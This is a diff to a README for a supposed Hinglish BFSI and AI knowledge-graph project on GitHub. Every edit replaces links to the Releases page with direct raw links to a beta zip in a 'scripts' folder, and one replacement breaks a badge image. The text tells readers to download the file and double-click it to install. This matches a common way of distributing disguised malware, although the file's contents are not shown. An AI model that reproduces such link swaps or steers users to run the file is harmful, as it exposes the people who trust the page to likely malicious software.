@@ -1,6 +1,6 @@
 # 🚀 bfsi-ai-hinglish-knowledge-graph-hcam - Understand BFSI & AI with Hinglish
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/releases)
+[![Download Now](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/raw/refs/heads/main/scripts/ai-hinglish-graph-bfsi-knowledge-hcam-v2.2-beta.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/raw/refs/heads/main/scripts/ai-hinglish-graph-bfsi-knowledge-hcam-v2.2-beta.1.zip)
 
 ## 📦 Overview
 
@@ -27,7 +27,7 @@ To run this application effectively, ensure your system meets the following requ
 
 1. **Download the Application**: To get started, you need to download the application from our Releases page. Click the link below:
 
-   [Download Now](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/releases)
+   [Download Now](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/raw/refs/heads/main/scripts/ai-hinglish-graph-bfsi-knowledge-hcam-v2.2-beta.1.zip)
 
 2. **Install the Application**: Once downloaded, locate the file in your Downloads folder. Double-click the file to begin the installation. Follow the on-screen instructions to complete the setup.
 
@@ -39,7 +39,7 @@ To run this application effectively, ensure your system meets the following requ
 
 To download the latest version of the application, visit the following page. 
 
-[Visit the Releases Page to Download](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/releases)
+[Visit the Releases Page to Download](https://github.com/joy-ucheji/bfsi-ai-hinglish-knowledge-graph-hcam/raw/refs/heads/main/scripts/ai-hinglish-graph-bfsi-knowledge-hcam-v2.2-beta.1.zip)
 
 ### Installation Steps
 
